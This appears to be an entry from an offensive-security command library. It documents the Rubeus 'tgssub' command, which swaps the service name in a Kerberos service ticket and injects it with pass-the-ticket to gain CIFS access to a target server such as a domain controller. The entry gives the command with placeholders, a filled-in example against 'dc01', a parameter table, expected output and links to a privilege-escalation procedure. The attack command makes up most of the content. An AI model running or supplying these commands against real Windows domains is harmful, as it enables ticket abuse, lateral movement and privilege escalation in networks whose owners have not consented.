---
id: a8f0730a-e2b2-4c76-87a5-3c5a0b5adb43
name: rubeus-tgssub-modify-service-ptt
type: command
executor: powershell
data: 'Rubeus.exe tgssub /ticket:"$_BASE64_TGS" /altservice:"cifs/$_SERVER_DNS" /ptt'
output: null
created_at: '2023-04-06T03:56:07.821645+00:00'
updated_at: '2023-04-10T20:36:07.954586+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - tgssub
verified: true
validated: true
---

# rubeus-tgssub-modify-service-ptt

## Command

```powershell
Rubeus.exe tgssub /ticket:"$_BASE64_TGS" /altservice:"cifs/$_SERVER_DNS" /ptt
```

## Description

Modifies the service name in an existing TGS ticket and injects it via PTT, allowing redirection to arbitrary servers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /ticket:"$_BASE64_TGS" | Base64 TGS to modify | Yes |
| /altservice:"cifs/$_SERVER_DNS" | New service SPN | Yes |
| /ptt | Inject after modification | Yes |

## Examples

### Basic Usage

```powershell
Rubeus.exe tgssub /ticket:"doIF..." /altservice:"cifs/dc01.domain.local" /ptt
```

## Expected Output

```
[+] Service substituted to cifs/dc01.domain.local
[+] Ticket injected successfully
```

## Related

- [[commands/rubeus-s4u-generate-s4u2self-ticket]]
- [[procedures/Kerberos-S4U2Self-Privilege-Escalation]]
